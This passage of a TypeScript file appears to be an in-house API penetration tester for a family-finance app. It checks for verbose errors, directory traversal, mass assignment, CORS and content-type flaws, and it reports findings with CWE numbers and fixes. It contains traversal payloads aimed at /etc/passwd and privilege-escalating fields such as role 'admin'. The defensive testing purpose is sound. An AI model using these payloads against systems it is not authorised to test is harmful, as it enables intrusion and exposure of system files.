          const errorMessage = response.data.message.toLowerCase();
          const sensitiveInfo = ['database', 'sql', 'query', 'table', 'column', 'prisma', 'connection'];

          if (sensitiveInfo.some(info => errorMessage.includes(info))) {
            this.addResult({
              endpoint: trigger.path,
              method: trigger.method,
              testCase: 'ERROR_MESSAGE_DISCLOSURE',
              severity: 'MEDIUM',
              status: 'VULNERABLE',
              description: 'Error message contains sensitive technical information',
              evidence: { errorMessage: response.data.message },
              recommendation: 'Use generic error messages that don\'t reveal system internals',
              cwe: 'CWE-209'
            });
          }
        }

      } catch (error) {
        // Expected
      }
    }
  }

  /**
   * Test error handling vulnerabilities
   */
  private async testErrorHandling(): Promise<void> {
    console.log('❌ Testing error handling...');

    const errorTests = [
      { path: '/api/invalid-endpoint', method: 'GET', expectedError: true },
      { path: '/api/families', method: 'POST', data: 'invalid-json', expectedError: true },
      { path: '/api/income-events', method: 'POST', data: { invalidField: 'test' }, expectedError: true }
    ];

    for (const test of errorTests) {
      try {
        const response = await this.makeRequest(test.method, test.path, test.data);

        // Check for verbose error messages
        if (response.status >= 400 && response.data) {
          const errorData = JSON.stringify(response.data);

          // Check for stack traces
          if (errorData.includes('at ') && errorData.includes('.js:')) {
            this.addResult({
              endpoint: test.path,
              method: test.method,
              testCase: 'STACK_TRACE_DISCLOSURE',
              severity: 'MEDIUM',
              status: 'VULNERABLE',
              description: 'Error response includes stack trace information',
              evidence: { errorData: errorData.substring(0, 200) },
              recommendation: 'Remove stack traces from error responses in production',
              cwe: 'CWE-209'
            });
          }

          // Check for file paths
          if (errorData.includes('/src/') || errorData.includes('\\src\\')) {
            this.addResult({
              endpoint: test.path,
              method: test.method,
              testCase: 'FILE_PATH_DISCLOSURE',
              severity: 'LOW',
              status: 'VULNERABLE',
              description: 'Error response includes internal file paths',
              evidence: { errorData: errorData.substring(0, 200) },
              recommendation: 'Remove file paths from error responses',
              cwe: 'CWE-209'
            });
          }
        }

      } catch (error) {
        // Expected
      }
    }
  }

  /**
   * Test directory traversal vulnerabilities
   */
  private async testDirectoryTraversal(): Promise<void> {
    console.log('📂 Testing directory traversal...');

    const traversalPayloads = [
      '../', '..\\', '..../', '....\\',
      '%2e%2e%2f', '%2e%2e%5c',
      '..%2f', '..%5c',
      '..%252f', '..%255c'
    ];

    const testPaths = [
      '/api/files/', '/api/static/', '/api/assets/', '/api/uploads/'
    ];

    for (const basePath of testPaths) {
      for (const payload of traversalPayloads) {
        try {
          const response = await this.makeRequest('GET', basePath + payload + 'etc/passwd');

          if (response.status === 200 && response.data) {
            const content = response.data.toString();
            if (content.includes('root:x:') || content.includes('daemon:x:')) {
              this.addResult({
                endpoint: basePath + payload + 'etc/passwd',
                method: 'GET',
                testCase: 'DIRECTORY_TRAVERSAL',
                severity: 'CRITICAL',
                status: 'VULNERABLE',
                description: 'Directory traversal vulnerability allows access to system files',
                evidence: { payload, content: content.substring(0, 100) },
                recommendation: 'Implement proper path validation and access controls',
                cwe: 'CWE-22'
              });
            }
          }

        } catch (error) {
          // Expected
        }
      }
    }
  }

  /**
   * Test mass assignment vulnerabilities
   */
  private async testMassAssignment(): Promise<void> {
    console.log('📝 Testing mass assignment vulnerabilities...');

    const massAssignmentTests = [
      {
        endpoint: '/api/auth/register',
        method: 'POST',
        maliciousFields: { role: 'admin', isAdmin: true, permissions: ['admin'] }
      },
      {
        endpoint: '/api/families',
        method: 'PUT',
        maliciousFields: { ownerId: 'different-user', permissions: 'admin' }
      },
      {
        endpoint: '/api/users/profile',
        method: 'PUT',
        maliciousFields: { role: 'admin', verified: true, credits: 999999 }
      }
    ];

    for (const test of massAssignmentTests) {
      try {
        const response = await this.makeRequest(test.method, test.endpoint, {
          ...test.maliciousFields,
          name: 'Test User',
          email: 'test@example.com'
        });

        if (response.status < 400 && response.data) {
          // Check if malicious fields were accepted
          const responseData = JSON.stringify(response.data);
          const acceptedFields = Object.keys(test.maliciousFields).filter(field =>
            responseData.includes(field)
          );

          if (acceptedFields.length > 0) {
            this.addResult({
              endpoint: test.endpoint,
              method: test.method,
              testCase: 'MASS_ASSIGNMENT',
              severity: 'HIGH',
              status: 'VULNERABLE',
              description: `Mass assignment vulnerability - unauthorized fields accepted: ${acceptedFields.join(', ')}`,
              evidence: { acceptedFields, response: responseData.substring(0, 200) },
              recommendation: 'Implement field whitelisting and prevent mass assignment of sensitive fields',
              cwe: 'CWE-915'
            });
          }
        }

      } catch (error) {
        // Expected for most mass assignment attempts
      }
    }
  }

  /**
   * Test API versioning vulnerabilities
   */
  private async testAPIVersioning(): Promise<void> {
    console.log('🔄 Testing API versioning vulnerabilities...');

    const versionTests = [
      '/v1/api/', '/v2/api/', '/api/v1/', '/api/v2/',
      '/api?version=1', '/api?version=2', '/api?v=1', '/api?v=2'
    ];

    for (const versionPath of versionTests) {
      try {
        const response = await this.makeRequest('GET', versionPath + 'families');

        if (response.status === 200) {
          this.addResult({
            endpoint: versionPath + 'families',
            method: 'GET',
            testCase: 'API_VERSION_ACCESS',
            severity: 'INFO',
            status: 'VULNERABLE',
            description: `Alternative API version accessible: ${versionPath}`,
            evidence: { versionPath, statusCode: response.status },
            recommendation: 'Ensure all API versions have consistent security controls',
            cwe: 'CWE-16'
          });
        }

      } catch (error) {
        // Expected
      }
    }
  }

  /**
   * Test CORS misconfiguration
   */
  private async testCORSMisconfiguration(): Promise<void> {
    console.log('🌐 Testing CORS misconfiguration...');

    const corsTests = [
      { origin: 'http://evil.com' },
      { origin: 'https://attacker.com' },
      { origin: 'null' },
      { origin: '*' }
    ];

    for (const test of corsTests) {
      try {
        const response = await this.makeRequest('GET', '/api/families', {}, {
          'Origin': test.origin
        });

        const accessControlOrigin = response.headers['access-control-allow-origin'];
        const accessControlCredentials = response.headers['access-control-allow-credentials'];

        if (accessControlOrigin === '*' && accessControlCredentials === 'true') {
          this.addResult({
            endpoint: '/api/families',
            method: 'GET',
            testCase: 'CORS_WILDCARD_WITH_CREDENTIALS',
            severity: 'HIGH',
            status: 'VULNERABLE',
            description: 'CORS allows wildcard origin with credentials',
            evidence: { origin: test.origin, accessControlOrigin, accessControlCredentials },
            recommendation: 'Never allow wildcard origin with credentials',
            cwe: 'CWE-942'
          });
        }

        if (accessControlOrigin === test.origin && test.origin.includes('evil')) {
          this.addResult({
            endpoint: '/api/families',
            method: 'GET',
            testCase: 'CORS_PERMISSIVE_ORIGIN',
            severity: 'MEDIUM',
            status: 'VULNERABLE',
            description: 'CORS allows potentially malicious origin',
            evidence: { origin: test.origin, accessControlOrigin },
            recommendation: 'Implement strict CORS origin validation',
            cwe: 'CWE-942'
          });
        }

      } catch (error) {
        // Expected
      }
    }
  }

  /**
   * Test content type validation
   */
  private async testContentTypeValidation(): Promise<void> {
    console.log('📄 Testing content type validation...');

    const contentTypeTests = [
      { contentType: 'application/json', data: '<xml>test</xml>' },
      { contentType: 'text/xml', data: '{"json": "data"}' },
      { contentType: 'text/plain', data: 'plain text data' },
      { contentType: 'image/jpeg', data: 'fake image data' }
    ];

    const testEndpoints = [
      '/api/families', '/api/income-events', '/api/payments'
    ];

    for (const endpoint of testEndpoints) {
      for (const test of contentTypeTests) {
        try {
          const response = await this.makeRequest('POST', endpoint, test.data, {
            'Content-Type': test.contentType
          });

          if (response.status < 400) {
            this.addResult({
              endpoint,
              method: 'POST',
              testCase: 'CONTENT_TYPE_BYPASS',
              severity: 'MEDIUM',
              status: 'VULNERABLE',
              description: `Content type validation bypass: ${test.contentType}`,
              evidence: { contentType: test.contentType, statusCode: response.status },
              recommendation: 'Implement strict content type validation',
              cwe: 'CWE-20'
            });
          }

        } catch (error) {
          // Expected for content type mismatches
        }
      }
    }
  }

  /**
   * Make HTTP request with error handling
   */
  private async makeRequest(
    method: string,
    path: string,
    data?: any,
    headers?: Record<string, string>
  ): Promise<AxiosResponse> {
    const config = {
      method: method.toLowerCase(),
      url: path,
      headers: headers || {},
      timeout: 10000,
      ...(data && ['post', 'put', 'patch'].includes(method.toLowerCase()) && { data })
    };

    return await this.apiClient.request(config);
  }

  /**
   * Add test result
   */
  private addResult(result: PenetrationTestResult): void {
    this.testResults.push(result);
  }

  /**
   * Generate test summary
   */
  private generateTestSummary(): PenetrationTestSummary {
    const vulnerabilities = this.testResults.filter(r => r.status === 'VULNERABLE');
    const criticalFindings = vulnerabilities.filter(r => r.severity === 'CRITICAL').length;
    const highFindings = vulnerabilities.filter(r => r.severity === 'HIGH').length;
    const mediumFindings = vulnerabilities.filter(r => r.severity === 'MEDIUM').length;
    const lowFindings = vulnerabilities.filter(r => r.severity === 'LOW').length;

    let overallRisk: 'CRITICAL' | 'HIGH' | 'MEDIUM' | 'LOW' = 'LOW';
    if (criticalFindings > 0) overallRisk = 'CRITICAL';
    else if (highFindings > 5) overallRisk = 'CRITICAL';
    else if (highFindings > 0) overallRisk = 'HIGH';
    else if (mediumFindings > 10) overallRisk = 'HIGH';
    else if (mediumFindings > 0) overallRisk = 'MEDIUM';

    return {
      totalTests: this.testResults.length,
      vulnerabilities: vulnerabilities.length,
      criticalFindings,
      highFindings,
      mediumFindings,
      lowFindings,
      overallRisk,
      results: this.testResults
    };
  }
}

/**
 * Run penetration tests
 */
export async function runAPIPenetrationTests(baseUrl?: string): Promise<PenetrationTestSummary> {
  const tester = new APIPenetrationTester(baseUrl);
  return await tester.runPenetrationTests();
}

/**
 * Generate penetration testing report
 */
export async function generatePenetrationTestReport(baseUrl?: string): Promise<void> {
  try {
    console.log('🔍 Starting API penetration testing...');
    const results = await runAPIPenetrationTests(baseUrl);

    console.log('\n' + '='.repeat(80));
    console.log('⚡ API PENETRATION TESTING REPORT');
    console.log('='.repeat(80));
    console.log(`📊 Total Tests: ${results.totalTests}`);
    console.log(`🚨 Vulnerabilities Found: ${results.vulnerabilities}`);
    console.log(`🔴 Critical: ${results.criticalFindings}`);
    console.log(`🟠 High: ${results.highFindings}`);
    console.log(`🟡 Medium: ${results.mediumFindings}`);
    console.log(`🔵 Low: ${results.lowFindings}`);
    console.log(`⚠️  Overall Risk: ${results.overallRisk}`);

    if (results.vulnerabilities > 0) {
      console.log('\n🚨 Vulnerabilities Found:');
      console.log('-'.repeat(80));

      const groupedResults = {
        CRITICAL: results.results.filter(r => r.severity === 'CRITICAL' && r.status === 'VULNERABLE'),
        HIGH: results.results.filter(r => r.severity === 'HIGH' && r.status === 'VULNERABLE'),
        MEDIUM: results.results.filter(r => r.severity === 'MEDIUM' && r.status === 'VULNERABLE'),
        LOW: results.results.filter(r => r.severity === 'LOW' && r.status === 'VULNERABLE')
      };

      for (const [severity, vulnerabilities] of Object.entries(groupedResults)) {
        if (vulnerabilities.length > 0) {
          console.log(`\n🔴 ${severity} SEVERITY (${vulnerabilities.length} vulnerabilities):`);
          vulnerabilities.forEach((vuln, index) => {
            console.log(`   ${index + 1}. ${vuln.testCase}: ${vuln.description}`);
            console.log(`      Endpoint: ${vuln.method} ${vuln.endpoint}`);
            console.log(`      Recommendation: ${vuln.recommendation}`);
            if (vuln.evidence) {
              console.log(`      Evidence: ${JSON.stringify(vuln.evidence).substring(0, 100)}...`);
            }
            if (vuln.cwe) console.log(`      CWE: ${vuln.cwe}`);
            console.log('');
          });
        }
      }
    }

    console.log('\n💡 Key Security Recommendations:');
    console.log('   1. Fix all CRITICAL vulnerabilities immediately');
    console.log('   2. Implement comprehensive input validation');
    console.log('   3. Enforce proper authentication and authorization');
    console.log('   4. Configure security headers and CORS properly');
    console.log('   5. Implement rate limiting on all sensitive endpoints');
    console.log('   6. Use parameterized queries to prevent SQL injection');
    console.log('   7. Validate and sanitize all user inputs');
    console.log('   8. Implement proper error handling without information disclosure');

    console.log('\n' + '='.repeat(80));
    console.log('✅ Penetration testing completed');
    console.log('='.repeat(80));

  } catch (error) {
    console.error('❌ Penetration testing failed:', error);
    throw error;
  }
}

// Execute tests if run directly
if (require.main === module) {
  generatePenetrationTestReport()
    .then(() => process.exit(0))
    .catch((error) => {
      console.error('Penetration testing failed:', error);
      process.exit(1);
    });
}